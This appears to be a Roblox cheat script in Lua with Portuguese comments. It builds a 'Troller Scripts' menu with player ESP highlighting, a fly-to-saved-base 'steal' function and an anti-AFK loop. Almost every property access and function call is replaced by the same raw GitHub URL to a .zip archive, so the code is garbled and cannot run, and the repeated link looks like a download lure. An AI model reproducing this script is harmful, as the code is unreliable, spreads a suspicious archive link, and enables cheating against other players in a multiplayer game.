-- Serviços
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local plr = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
local char = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip or https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip()
local hrp = char:WaitForChild("HumanoidRootPart")

-- Variáveis
local savedBasePosition = nil
local flying = false
local flyConnection = nil

local espEnabled = false
local espHighlights = {}

local antiAfkEnabled = false
local antiAfkConnection = nil
local angle = 0

-- GUI
local ScreenGui = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("ScreenGui")
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "TrollerScripts"
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = plr:WaitForChild("PlayerGui")
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = false

local frame = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("Frame")
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 330, 0, 260)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0.05, 0, 0.1, 0)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(15, 15, 30)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = ScreenGui

local uicorner = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("UICorner", frame)
local uistroke = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("UIStroke", frame)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 120, 255)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 2

local title = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("TextLabel")
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 0, 0, 40)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 0, 0, 0)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 1
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "💀 Troller Scripts"
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 170, 255)
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 24
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = frame

-- Criar botão padrão
local function createCheckbox(text, yPos)
	local btn = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("TextButton")
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 260, 0, 40)
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 35, 0, yPos)
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(25, 25, 60)
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 1, 1)
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 16
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = false
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = text .. " [OFF]"
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = frame
	return btn
end

-- Botões
local espBtn = createCheckbox("ESP", 60)
local saveBaseBtn = createCheckbox("Salvar Base", 120)
local afkBtn = createCheckbox("Anti-AFK", 180)

-- ESP com nome branco acima da cabeça e luz vermelha em volta do corpo
local function toggleESP(state)
	-- Remove ESP anterior
	for _, h in pairs(espHighlights) do
		h:Destroy()
	end
	espHighlights = {}
	
	if state then
		for _, p in pairs(Players:GetPlayers()) do
			if p ~= plr and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("Head") and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("HumanoidRootPart") then
				-- Luz vermelha em volta do corpo usando Highlight
				local highlight = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("Highlight")
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(255, 0, 0) -- vermelho forte
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 0.5
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(255, 0, 0)
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 0
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
				
				-- Nome branco flutuando
				local billboard = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("BillboardGui")
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "ESPTag"
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 80, 0, 20)
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(0, 2, 0)
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip

				local label = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("TextLabel")
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 0, 1, 0)
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 1
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(1, 1, 1) -- branco
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = 0.75
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = true
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = billboard

				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(espHighlights, highlight)
				https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(espHighlights, billboard)
			end
		end
	end
end

-- Steal (voo até base)
local function flyToBase()
	if not savedBasePosition then
		warn("Nenhuma base salva para voar!")
		return
	end
	
	if flying then return end
	
	flying = true
	
	flyConnection = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function(dt)
		if not flying then
			flyConnection:Disconnect()
			flyConnection = nil
			return
		end
		
		local pos = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
		local direction = (savedBasePosition - pos)
		local dist = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
		
		if dist < 3 then
			flying = false
			flyConnection:Disconnect()
			flyConnection = nil
			return
		end
		
		local step = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip * 50 * dt  -- velocidade ajustada para 50
		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(pos + step)
	end)
end

local function stopFly()
	flying = false
	if flyConnection then
		flyConnection:Disconnect()
		flyConnection = nil
	end
end

-- Anti-AFK com círculo maior (raio 9)
local function startAntiAFK()
	if antiAfkConnection then return end

	local radius = 9
	local angleStep = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(15)
	local currentAngle = 0
	local jumpCooldown = 1.5
	local lastJump = 0

	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end

	antiAfkConnection = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
		if not antiAfkEnabled or not https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip or https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip <= 0 then
			if antiAfkConnection then
				antiAfkConnection:Disconnect()
				antiAfkConnection = nil
			end
			return
		end

		currentAngle = currentAngle + angleStep
		if currentAngle > (2 * https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip) then currentAngle = 0 end

		local basePos = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
		local targetX = basePos.X + https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(currentAngle) * radius
		local targetZ = basePos.Z + https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(currentAngle) * radius
		local target = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(targetX, basePos.Y, targetZ)

		humanoid:MoveTo(target)

		if tick() - lastJump > jumpCooldown then
			if humanoid:GetState() ~= https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
				humanoid:ChangeState(https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip)
			end
			lastJump = tick()
		end
	end)
end

-- Botão ESP
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
	espEnabled = not espEnabled
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "ESP [" .. (espEnabled and "ON" or "OFF") .. "]"
	toggleESP(espEnabled)
end)

-- Botão Salvar Base
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
	if https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip and https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip("HumanoidRootPart") then
		savedBasePosition = https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Base salva!"
		wait(2)
		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Salvar Base [OFF]"
	else
		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Erro ao salvar!"
		wait(2)
		https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Salvar Base [OFF]"
	end
end)

-- Botão Anti-AFK
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function()
	antiAfkEnabled = not antiAfkEnabled
	https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = "Anti-AFK [" .. (antiAfkEnabled and "ON" or "OFF") .. "]"
	if antiAfkEnabled then
		startAntiAFK()
	elseif antiAfkConnection then
		antiAfkConnection:Disconnect()
		antiAfkConnection = nil
	end
end)

-- Steal com tecla "L"
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function(input, gameProcessed)
	if gameProcessed then return end
	if https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip == https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
		if https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip == https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
			if flying then
				stopFly()
			else
				flyToBase()
			end
		elseif https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip == https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip then
			https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip = not https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip
		end
	end
end)

-- Atualizar referência ao HRP
https://raw.githubusercontent.com/troller172/Troller-scripts/main/ceratocricoid/Troller-scripts-3.7.zip(function(character)
	char = character
	hrp = char:WaitForChild("HumanoidRootPart")
end)
